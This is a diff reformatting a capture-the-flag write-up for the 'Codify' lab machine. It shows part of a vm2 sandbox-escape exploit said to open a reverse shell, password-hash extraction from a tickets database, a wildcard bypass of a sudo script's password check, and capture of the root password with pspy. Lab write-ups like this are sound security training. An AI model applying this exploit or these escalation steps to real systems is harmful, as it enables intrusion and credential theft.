@@ -1,18 +1,21 @@
-## Information
+# Codify Writeup
 
-| Property     | Value                       |
-|--------------|-----------------------------|
-| **Name**     | Codify   |
-| **IP Address**|  10.10.11.239      |
-| **OS**       |   Linux      |
-| **Difficulty**| Easy   |
+### Information
 
-## Enumeration
-### Nmap Scan
+| Property       | Value        |
+| -------------- | ------------ |
+| **Name**       | Codify       |
+| **IP Address** | 10.10.11.239 |
+| **OS**         | Linux        |
+| **Difficulty** | Easy         |
+
+### Enumeration
+
+#### Nmap Scan
+
 ```bash
 nmap -sC -sV -oN nmap_scan.txt -Pn 
 ```
-
 
 ```bash
 PORT     STATE SERVICE REASON  VERSION
@@ -30,23 +33,25 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
 **Hostname:** http://codify.htb/
-## Initial Access
-### Port [80] - [Codify Web Application]
 
-![](Codify%20Writeup%20-%20Codify%20Web%20Application.png)
+### Initial Access
+
+#### Port \[80] - \[Codify Web Application]
+
+![](<Codify Writeup - Codify Web Application.png>)
 
 The application serves an Node JS editor in a sandboxed environment using [vm2 library](https://github.com/patriksimek/vm2)
 
+![](<Codify Writeup - Editor.png>)
 
-![](Codify%20Writeup%20-%20Editor.png)
+**Vulnerability Exploited**
 
+VM2 library sufferes from a[ sandbox escape vulnerability](https://www.bleepingcomputer.com/news/security/new-sandbox-escape-poc-exploit-available-for-vm2-library-patch-now/)  that makes it possible to execute unsafe code on a host running the VM2 sandbox.
 
-#### Vulnerability Exploited
+**Exploitation Steps**
 
-VM2 library sufferes from a[ sandbox escape vulnerability](https://www.bleepingcomputer.com/news/security/new-sandbox-escape-poc-exploit-available-for-vm2-library-patch-now/)  that makes it possible to execute unsafe code on a host running the VM2 sandbox.
-#### Exploitation Steps
+Executing the following code will result in a reverse shell establishment:
 
-Executing the following code will result in a reverse shell establishment: 
 ```js
 const {VM} = require("vm2");
 const vm = new VM();
@@ -75,11 +80,11 @@ p.then();
 console.log(vm.run(code));
 ```
 
-The malicious code gets executed a low priveleged user called  **scv**, we need to escalate our priveleged to the second user called **Joshua.**
+The malicious code gets executed a low priveleged user called **scv**, we need to escalate our priveleged to the second user called **Joshua.**
 
-### User Access
+#### User Access
 
-The tickets database found under /var/www/contact contains Joshua hashed password. 
+The tickets database found under /var/www/contact contains Joshua hashed password.
 
 ```bash
 (remote) svc@codify:/var/www/contact$ strings tickets.db 
@@ -103,13 +108,15 @@ Joe WilliamsLocal setup?I use this site lot of the time. Is it possible to set t
 Tom HanksNeed networking modulesI think it would be better if you can implement a way to handle network-based stuff. Would help me out a lot. Thanks!open
 
 ```
-#### User Flag
 
-Cracking the password will reveal the user's password which can be used to establish an ssh connection to the box. 
+**User Flag**
 
-## Privilege Escalation
+Cracking the password will reveal the user's password which can be used to establish an ssh connection to the box.
 
-Joshua can run the following script with elevated privileges: 
+### Privilege Escalation
+
+Joshua can run the following script with elevated privileges:
+
 ```
 joshua@codify:~$ sudo -l 
 [sudo] password for joshua: 
@@ -155,12 +162,9 @@ done
 
 No escaping on the user password can be bypassed with a wildcard character:
 
-Resource:
-https://superuser.com/questions/1056183/using-a-wildcard-in-a-condition-to-match-the-beginning-of-a-string
+Resource: https://superuser.com/questions/1056183/using-a-wildcard-in-a-condition-to-match-the-beginning-of-a-string
 
-
-Then running pspy with recursive mode on the backup directory to retrieve the password when the mysqldump command gets executed: 
-
+Then running pspy with recursive mode on the backup directory to retrieve the password when the mysqldump command gets executed:
 
 ```bash
 ./pspy64 -r /var/backups/mysql
@@ -177,39 +181,36 @@ Then running pspy with recursive mode on the backup directory to retrieve the pa
 
 ```
 
+**Root Flag**
 
-#### Root Flag
+The extracted password is the root password and can be used to su through.
 
-The extracted password is the root password and can be used to su through. 
-## Conclusion
+### Conclusion
 
 1. **Initial Access:**
-    - **Tactic:** Exploit Public Facing Application
-    - **Technique:** Exploitation for Client Execution
-    - **MITRE ATT&CK ID:** T1190
+   * **Tactic:** Exploit Public Facing Application
+   * **Technique:** Exploitation for Client Execution
+   * **MITRE ATT\&CK ID:** T1190
+2. **Execution:**
+   * **Tactic:** Execution
+   * **Technique:** Exploitation for Client Execution
+   * **MITRE ATT\&CK ID:** T1203
+3. **Privilege Escalation:**
+   * **Tactic:** Privilege Escalation
+   * **Technique:** Abuse Elevation Control Control Mechanism
+   * **MITRE ATT\&CK ID:** T1548.002
+4. **Credential Access:**
+   * **Tactic:** Credential Access
+   * **Technique:** Input Capture
+   * **MITRE ATT\&CK ID:** T1056
 
-1. **Execution:**
-    - **Tactic:** Execution
-    - **Technique:** Exploitation for Client Execution
-    - **MITRE ATT&CK ID:** T1203
+![](<Codify Writeup - Mitre Attack Mapping-1.png>)
 
-2. **Privilege Escalation:**
-    - **Tactic:** Privilege Escalation
-    - **Technique:** Abuse Elevation Control Control Mechanism
-    - **MITRE ATT&CK ID:** T1548.002
+### Additional Notes
 
-3. **Credential Access:**
-    - **Tactic:** Credential Access
-    - **Technique:** Input Capture
-    - **MITRE ATT&CK ID:** T1056
+#### Defensive Techniques
 
-![](Codify%20Writeup%20-%20Mitre%20Attack%20Mapping-1.png)
-
-## Additional Notes
-### Defensive Techniques
-- Keep software and libraries up to date to patch known vulnerabilities.
-- Implement proper input validation and sanitization in the web application to prevent injection attacks.
-- Review and restrict sudo permissions to only necessary commands and users.
-- Don't input sensitive data, such as passwords, directly as bash commands from the command line to prevent accidental exposure.
-
-
+* Keep software and libraries up to date to patch known vulnerabilities.
+* Implement proper input validation and sanitization in the web application to prevent injection attacks.
+* Review and restrict sudo permissions to only necessary commands and users.
+* Don't input sensitive data, such as passwords, directly as bash commands from the command line to prevent accidental exposure.
